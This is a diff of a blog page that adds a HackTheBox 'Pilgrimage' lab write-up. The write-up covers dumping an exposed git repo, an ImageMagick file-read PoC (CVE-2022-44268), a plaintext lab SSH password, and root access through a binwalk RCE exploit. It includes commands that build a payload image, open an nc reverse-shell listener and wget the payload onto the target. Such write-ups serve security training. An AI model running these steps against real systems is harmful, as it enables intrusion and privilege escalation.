@@ -5,11 +5,6 @@
     <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=7" />
 
-    
-        
-          <link href="https://bott0n.github.io/tags/index.xml" rel="alternate" type="application/rss+xml" title="Blogs" />
-          <link href="https://bott0n.github.io/tags/index.xml" rel="feed" type="application/rss+xml" title="Blogs" />
-        
     <link
     rel="icon"
     href='/favicon.png'
@@ -32,7 +27,7 @@
 
 <title>
         
-            Tags  &ndash;
+            Hackthebox Writeup Pilgrimage  &ndash;
         
         Blogs
     </title>
@@ -44,35 +39,51 @@
 <meta name="author" content="button" />
 
     
-        <meta name="description" content="A description for my website" />
+        <meta name="keywords" content='hackthebox' />
+    
+    
+        <meta name="description" content="" />
     
 
 <meta property="og:site_name"
     content='Blogs' />
 
-    <meta property="og:title"
-        content='Blogs' />
+    <meta property="og:title" content="Hackthebox Writeup Pilgrimage" />
+    <meta property="og:type" content="article" />
     
-        <meta property="og:description" content="A description for my website" />
+    <meta
+        property="article:author" content="button" />
+    <meta
+        property="article:published_time"
+        content='2023-07-08T16:04:50Z&#43;0800' />
     
-    <meta property="og:type" content="blog" />
+        
+            <meta property="article:tag" content="hackthebox" />
+        
+    
+    <meta property="og:url" content="https://bott0n.github.io/posts/hackthebox-writeup-pilgrimage/" />
     <meta property="og:image"
-        content='https://bott0n.github.io/icon512.png' />
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="" />
+    
 
 <meta name="twitter:card" content="summary_large_image" />
 <meta property="twitter:domain"
       content='bott0n.github.io'
 />
-<meta property="twitter:url" content="https://bott0n.github.io/tags/" />
+<meta property="twitter:url" content="https://bott0n.github.io/posts/hackthebox-writeup-pilgrimage/" />
 
 
-    <meta name="twitter:title"
-        content='Blogs' />
-    
-        <meta name="twitter:description" content="A description for my website" />
+    <meta name="twitter:title" content="Hackthebox Writeup Pilgrimage" />
     
     <meta name="twitter:image"
-        content='https://bott0n.github.io/icon512.png' />
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="" />
+    
 
 <link rel="manifest" href="/manifest/index.json" />
 </head>
@@ -188,28 +199,76 @@
 <div id="contentContainer">
                 <div id="content">
                     <main>
-    <h2>
+<article class="card single">
+    
+        <h1>Hackthebox Writeup Pilgrimage</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-07-08
+
+</p>
     
     
     
-    
-        Tags:
-    
-</h2>
-<ul class="list">
-    
+    <div class="articleToc">
+    <nav id="TableOfContents"></nav>
+    <hr />
+</div>
+
+    <div><h1 id="user-shell">User Shell</h1>
+<p>We found .git directory from nmap</p>
+<p><img src="https://i.imgur.com/zDIJgzy.png" alt=""></p>
+<p>We can use git-dumper to dump the git repo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./git_dumper.py http://pilgrimage.htb/.git git
+</code></pre></div><p>We found a binary file magick, google it we found a poc
+<a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</a></p>
+<p><img src="https://i.imgur.com/Zn4ejHV.png" alt="Imgur"></p>
+<p>We now can read any file we want, from the source code, we found &ldquo;sqlite:/var/db/pilgrimage&rdquo;</p>
+<p><img src="https://i.imgur.com/k15YNzy.png" alt="Imgur">
+Read that file, we can find the password of emily</p>
+<p><code>emily : abigchonkyboi123</code></p>
+<p>Then we are able to ssh with emaily</p>
+<h1 id="root">Root</h1>
+<p>From linpeas reuslt, we can find a file “/usr/sbin/malwarescan.sh” executed by root
+<img src="https://i.imgur.com/4dsfHLx.png" alt="Imgur"></p>
+<p><img src="https://i.imgur.com/sppCU1a.png" alt="Imgur"></p>
+<p>By reading the content, the script means:</p>
+<ol>
+<li>notice new created any file in &ldquo;/var/www/pilgrimage.htb/shrunk/&rdquo;</li>
+<li>binwalk the new files</li>
+<li>If the file containsed blacklist, it will remove it</li>
+</ol>
+<p>the binwalk location is intersting, we dry run it once</p>
+<p><img src="https://i.imgur.com/Wb4uAYx.png" alt="Imgur"></p>
+<p>We could knew it is v2.3.2, google it, we will find it has a RCE vulnerability.</p>
+<p>As a result, we use the poc to gain the root reverse shell
+<a href="https://www.exploit-db.com/exploits/51249">https://www.exploit-db.com/exploits/51249</a></p>
+<pre tabindex="0"><code># In host:
+python3 lpe.py shit.png 10.10.14.35 443
+
+nc -lvnp 443
+
+# In victim:
+wget 10.10.14.35/binwalk_exploit.png
+</code></pre><p><img src="https://i.imgur.com/T8KUpkq.png" alt="Imgur"></p></div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
         
+            <a
+                
+                href="/tags/hackthebox">#hackthebox</a>
         
-            <li>
-                <a href="https://bott0n.github.io/tags/ctf/">#ctf</a>
-            </li>
-        
-            <li>
-                <a href="https://bott0n.github.io/tags/hackthebox/">#hackthebox</a>
-            </li>
-        
-    
-</ul>
+    </p>
+
+
+
+
 
 
                     </main><footer>
